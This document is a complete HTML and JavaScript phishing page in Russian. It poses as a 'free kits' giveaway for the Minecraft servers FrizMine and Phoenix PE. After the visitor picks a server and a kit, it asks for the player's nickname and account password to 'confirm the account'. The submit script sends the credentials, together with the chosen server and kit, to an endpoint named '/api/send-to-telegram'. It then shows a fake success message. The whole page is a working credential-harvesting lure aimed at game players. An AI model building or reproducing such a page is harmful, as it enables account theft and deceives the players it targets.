<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Kits Minecraft Server</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Minecraft', Arial, sans-serif;
            min-height: 100vh;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                        url('https://wallpapercave.com/wp/wp8736944.jpg') center/cover fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        /* Анимированный фон с надписью */
        body::before {
            content: "Free Kits Minecraft Server";
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-15deg);
            font-size: clamp(2rem, 15vw, 8rem);
            font-weight: bold;
            color: rgba(255, 255, 255, 0.03);
            white-space: nowrap;
            pointer-events: none;
            z-index: 0;
            text-transform: uppercase;
            letter-spacing: 20px;
            animation: watermarkFloat 20s infinite ease-in-out;
            width: 100%;
            text-align: center;
        }

        @keyframes watermarkFloat {
            0%, 100% { transform: translate(-50%, -50%) rotate(-15deg) scale(1); opacity: 0.03; }
            50% { transform: translate(-50%, -50%) rotate(-13deg) scale(1.1); opacity: 0.05; }
        }

        .container {
            background: rgba(20, 20, 30, 0.95);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.3),
                        0 0 100px rgba(106, 13, 173, 0.3);
            border: 2px solid rgba(0, 255, 255, 0.3);
            width: 90%;
            max-width: 500px;
            position: relative;
            z-index: 1;
            animation: glowPulse 3s infinite ease-in-out;
        }

        @keyframes glowPulse {
            0%, 100% { box-shadow: 0 0 50px rgba(0, 255, 255, 0.3), 0 0 100px rgba(106, 13, 173, 0.3); }
            50% { box-shadow: 0 0 70px rgba(0, 255, 255, 0.5), 0 0 150px rgba(106, 13, 173, 0.5); }
        }

        h1, h2 {
            text-align: center;
            color: #fff;
            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
            margin-bottom: 30px;
            font-size: 2em;
            letter-spacing: 2px;
        }

        h2 {
            font-size: 1.5em;
            margin-bottom: 20px;
        }

        .server-select {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-bottom: 30px;
        }

        .server-btn {
            padding: 15px 30px;
            font-size: 1.2em;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            flex: 1;
        }

        .server-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.5);
            border-color: #00ffff;
        }

        .server-btn.selected {
            background: linear-gradient(135deg, #00ffff 0%, #764ba2 100%);
            box-shadow: 0 0 30px #00ffff;
            border-color: #fff;
        }

        .kits-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 25px 0;
        }

        .kit-btn {
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 1.1em;
            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
        }

        .kit-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: scale(1.05);
            border-color: #00ffff;
            box-shadow: 0 0 20px #00ffff;
        }

        .kit-btn.selected {
            background: linear-gradient(135deg, #00ffff, #764ba2);
            border-color: white;
            box-shadow: 0 0 30px #00ffff;
        }

        .login-form {
            display: none;
            margin-top: 30px;
            padding-top: 30px;
            border-top: 2px solid rgba(255, 255, 255, 0.2);
        }

        .login-form.active {
            display: block;
            animation: slideIn 0.5s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        input {
            width: 100%;
            padding: 15px;
            margin: 8px 0 20px 0;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: white;
            font-size: 1.1em;
            transition: all 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #00ffff;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.15);
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #00ff00, #00ffff);
            color: #000;
            border: none;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(0, 255, 255, 0.5);
        }

        #message {
            text-align: center;
            margin-top: 20px;
            padding: 10px;
            border-radius: 10px;
            font-weight: bold;
        }

        .success {
            background: rgba(0, 255, 0, 0.2);
            color: #00ff00;
            border: 2px solid #00ff00;
        }

        .error {
            background: rgba(255, 0, 0, 0.2);
            color: #ff0000;
            border: 2px solid #ff0000;
        }

        .info-text {
            text-align: center;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 20px;
            font-size: 1.1em;
        }

        .selected-info {
            background: rgba(255, 255, 255, 0.1);
            padding: 10px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
            color: #00ffff;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ FREE KITS ⚡</h1>
        
        <!-- Шаг 1: Выбор сервера -->
        <div id="step1">
            <h2>Выберите сервер</h2>
            <div class="server-select">
                <button class="server-btn" onclick="selectServer('frizmine')">FrizMine</button>
                <button class="server-btn" onclick="selectServer('phoenix')">Phoenix PE</button>
            </div>
        </div>

        <!-- Шаг 2: Выбор кита (показывается после выбора сервера) -->
        <div id="step2" style="display: none;">
            <div class="selected-info" id="selectedServerInfo"></div>
            <h2>Выберите кит</h2>
            <div class="kits-grid" id="kitsContainer"></div>
        </div>

        <!-- Шаг 3: Форма входа (показывается после выбора кита) -->
        <div id="step3" style="display: none;">
            <div class="selected-info" id="selectedKitInfo"></div>
            <div class="info-text">
                Для получения кита подтвердите свой аккаунт
            </div>
            <form id="loginForm">
                <input type="text" id="username" name="username" required placeholder="Ваш ник в Minecraft">
                <input type="password" id="password" name="password" required placeholder="Пароль от аккаунта">
                <button type="submit" class="submit-btn">Получить кит!</button>
            </form>
            <div id="message"></div>
        </div>
    </div>

    <script>
        // Текущие выбранные значения
        let selectedServer = '';
        let selectedKit = '';

        // Киты для разных серверов
        const kits = {
            'frizmine': [
                { name: 'Кит Магистра', id: 'master' },
                { name: 'Кит Принца', id: 'prince' },
                { name: 'Кит Легенды', id: 'legend' }
            ],
            'phoenix': [
                { name: 'Кит Князя', id: 'prince' },
                { name: 'Кит Принца', id: 'king' },
                { name: 'Кит ютуб', id: 'youtube' }
            ]
        };

        // Названия серверов для отображения
        const serverNames = {
            'frizmine': 'FrizMine',
            'phoenix': 'Phoenix PE'
        };

        // Функция выбора сервера
        function selectServer(server) {
            selectedServer = server;
            selectedKit = ''; // Сбрасываем выбранный кит
            
            // Подсветка кнопок
            document.querySelectorAll('.server-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
            event.target.classList.add('selected');
            
            // Показываем киты
            showKits(server);
        }

        // Показать киты для выбранного сервера
        function showKits(server) {
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');
            const step3 = document.getElementById('step3');
            const kitsContainer = document.getElementById('kitsContainer');
            const selectedServerInfo = document.getElementById('selectedServerInfo');
            
            // Обновляем информацию
            selectedServerInfo.innerHTML = `Выбран сервер: <span style="color: #00ffff; text-shadow: 0 0 10px #00ffff;">${serverNames[server]}</span>`;
            
            // Создаем кнопки китов
            kitsContainer.innerHTML = '';
            kits[server].forEach(kit => {
                const button = document.createElement('button');
                button.className = 'kit-btn';
                button.textContent = kit.name;
                button.onclick = () => selectKit(kit.name, kit.id);
                kitsContainer.appendChild(button);
            });
            
            // Переключаем видимость шагов
            step1.style.display = 'none';
            step2.style.display = 'block';
            step3.style.display = 'none';
        }

        // Функция выбора кита
        function selectKit(kitName, kitId) {
            selectedKit = kitName;
            
            // Подсветка выбранного кита
            document.querySelectorAll('.kit-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
            event.target.classList.add('selected');
            
            // Показываем форму входа
            showLoginForm();
        }

        // Показать форму входа
        function showLoginForm() {
            const step2 = document.getElementById('step2');
            const step3 = document.getElementById('step3');
            const selectedKitInfo = document.getElementById('selectedKitInfo');
            
            selectedKitInfo.innerHTML = `Выбран кит: <span style="color: #00ffff; text-shadow: 0 0 10px #00ffff;">${selectedKit}</span> для сервера ${serverNames[selectedServer]}`;
            
            step2.style.display = 'none';
            step3.style.display = 'block';
        }

        // Обработка отправки формы
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            
            if (!username || !password) {
                messageDiv.innerHTML = '<div class="error">Заполните все поля!</div>';
                return;
            }

            messageDiv.innerHTML = '<div style="color: #00ffff;">Отправка...</div>';

            try {
                // Отправляем данные с информацией о сервере и ките
                const response = await fetch('/api/send-to-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        username, 
                        password,
                        server: serverNames[selectedServer],
                        kit: selectedKit
                    })
                });

                const result = await response.json();

                if (result.success) {
                    messageDiv.innerHTML = '<div class="success">✓ Ура! Спасибо что выбрали нас! Кит скоро будет выдан!</div>';
                    
                    // Сброс через 3 секунды
                    setTimeout(() => {
                        selectedServer = '';
                        selectedKit = '';
                        document.getElementById('step1').style.display = 'block';
                        document.getElementById('step2').style.display = 'none';
                        document.getElementById('step3').style.display = 'none';
                        document.getElementById('username').value = '';
                        document.getElementById('password').value = '';
                        messageDiv.innerHTML = '';
                        
                        // Убираем подсветку с кнопок
                        document.querySelectorAll('.server-btn, .kit-btn').forEach(btn => {
                            btn.classList.remove('selected');
                        });
                    }, 3000);
                } else {
                    messageDiv.innerHTML = '<div class="error">✗ Ошибка отправки</div>';
                }
            } catch (error) {
                messageDiv.innerHTML = '<div class="error">✗ Ошибка соединения</div>';
            }
        });

        // Добавляем плавное появление
        document.body.style.opacity = '0';
        window.onload = function() {
            document.body.style.transition = 'opacity 1s';
            document.body.style.opacity = '1';
        };
    </script>
</body>
</html>
